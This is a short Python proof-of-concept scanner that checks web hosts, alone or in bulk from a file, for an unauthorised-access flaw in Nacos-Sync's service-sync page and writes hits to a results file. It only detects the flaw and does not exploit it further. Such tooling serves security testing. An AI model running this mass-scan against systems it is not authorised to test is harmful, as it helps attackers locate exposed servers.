import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """
            
                ███╗   ██╗ █████╗  ██████╗ ██████╗ ███████╗
                ████╗  ██║██╔══██╗██╔════╝██╔═══██╗██╔════╝
                ██╔██╗ ██║███████║██║     ██║   ██║███████╗
                ██║╚██╗██║██╔══██║██║     ██║   ██║╚════██║
                ██║ ╚████║██║  ██║╚██████╗╚██████╔╝███████║
                ╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                                author:秋妤
                                                                date:2024.09.08
                                                                version:1.0                                      
           
            """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='Nacos-Sync未授权漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/#/serviceSync'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if res.status_code == 200 and 'id="root"' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('Nacos-Sync_result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()